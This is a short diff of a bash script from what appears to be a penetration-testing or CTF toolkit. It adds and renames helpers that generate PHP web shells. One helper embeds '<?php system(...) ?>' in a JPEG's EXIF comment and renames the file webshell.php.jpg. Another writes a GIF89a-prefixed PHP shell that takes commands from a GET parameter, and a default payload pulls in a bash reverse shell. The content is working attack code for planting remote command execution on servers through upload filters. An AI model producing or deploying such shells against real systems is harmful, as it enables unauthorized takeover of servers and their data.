@@ -150,8 +150,11 @@ run_aspx_shell_command() {
 
 }
 
-
 create_php_web_shell() {
+    create_php_webshell
+}
+
+create_php_webshell() {
     cp $SCRIPTDIR/../php/webshell.php .
     if [[ -z "$cmd" ]]; then
         cmd=$(get_bash_reverse_shell)
@@ -216,7 +219,18 @@ create_image_webshell() {
         command="'$cmd'"
     fi
     exiftool -Comment="<?php system($command); ?>" blank.jpg
-    file blank.jpg
+    mv blank.jpg webshell.php.jpg
+}
+
+create_image_gif_webshell() {
+    local command=""
+    if [[ -z "$cmd" ]]; then
+        command="\$_GET[\"cmd\"]"
+    else
+        command="'$cmd'"
+    fi
+    echo -e "GIF89a;\n<?php system($command); ?>" > webshell.php
+
 }
 
 create_nodejs_webshell() {
